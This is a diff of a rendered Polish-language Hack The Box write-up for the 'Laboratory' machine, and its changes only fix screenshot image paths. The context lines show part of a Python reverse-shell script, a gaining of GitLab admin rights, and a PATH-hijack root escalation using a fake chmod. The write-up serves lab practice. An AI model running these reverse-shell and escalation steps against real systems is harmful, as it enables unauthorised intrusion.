@@ -272,9 +272,9 @@ Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>Dodanie do /etc/hosts <code>git.laboratory.htb</code> oraz <code>laboratory.htb</code></p>
 <hr>
 <h1 id="gitlaboratory">Git.laboratory<a hidden class="anchor" aria-hidden="true" href="#gitlaboratory">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210910204203.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210910204203.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210910204246.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210910204246.png" alt=""  />
 </p>
 <hr>
 <h1 id="version">Version<a hidden class="anchor" aria-hidden="true" href="#version">#</a></h1>
@@ -348,23 +348,23 @@ echo <span style="color:#e6db74">&#34;os.dup2(s.fileno(),1)&#34;</span> &gt;&gt;
 echo <span style="color:#e6db74">&#34;os.dup2(s.fileno(),2)&#34;</span> &gt;&gt; script.py
 echo <span style="color:#e6db74">&#39;p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span> &gt;&gt; script.py
 </code></pre></div><p>a następnie uruchomienie takiego skryptu, <code>/opt/gitlab/embedded/bin/python3 script.py</code> i jednoczesne nasłuciwanie na porcie 9001</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912004336.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912004336.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912010852.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912010852.png" alt=""  />
 </p>
 <hr>
 <h2 id="zmiana-użytkownika-na-admin-w-gitlabie">Zmiana użytkownika na admin w Gitlabie<a hidden class="anchor" aria-hidden="true" href="#zmiana-użytkownika-na-admin-w-gitlabie">#</a></h2>
 <p><a href="https://forum.gitlab.com/t/how-do-i-change-my-profile-to-admin/35888">https://forum.gitlab.com/t/how-do-i-change-my-profile-to-admin/35888</a></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912014732.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912014732.png" alt=""  />
 </p>
 <p>Przez to działanie, pojawił się panel administracyjny w Gitlabie</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912014831.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912014831.png" alt=""  />
 </p>
 <h2 id="ssh">SSH<a hidden class="anchor" aria-hidden="true" href="#ssh">#</a></h2>
 <p>W jednym z projektów był zamieszczony klucz ssh</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912015307.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912015307.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912015335.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912015335.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>f36c379ba431b8c60ad3c2aed220b219</code></p>
@@ -384,9 +384,9 @@ ELF&gt;p@9@8
 <hr>
 <h2 id="ltrace">ltrace<a hidden class="anchor" aria-hidden="true" href="#ltrace">#</a></h2>
 <p>Widać tutaj jednak, że aplikacja ustawa uid na 0 (czyli roota) i wykonuje <code>chmod</code> na aplikacjach. To daje furtkę do eskalacji w zmiennej <code>$PATH</code>, bo aplikacja jest właśnie w jednym z tych folderów</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912023953.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912023953.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912023729.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912023729.png" alt=""  />
 </p>
 <hr>
 <p>Zatem w <code>/home/dexter</code> został utworzony plik <code>chmod</code>:</p>
@@ -395,7 +395,7 @@ ELF&gt;p@9@8
 </code></pre></div><p><code>chmod +x chmod</code> :)</p>
 <p>Dodanie na początku ścieżki lokacji <code>chmod</code> (czyli praktycznie folder domowy)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/dexter:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin&#34;</span>
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210912025443.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210912025443.png" alt=""  />
 </p>
 <p>Kiedy został uruchomiony <code>docker-security</code> i skrypt doszedł do słowa <code>chmod</code> od razu przerwał skrypt i wykonał kod, czyli stworzenie basha z rootem :)</p>
 <p>root.txt</p>
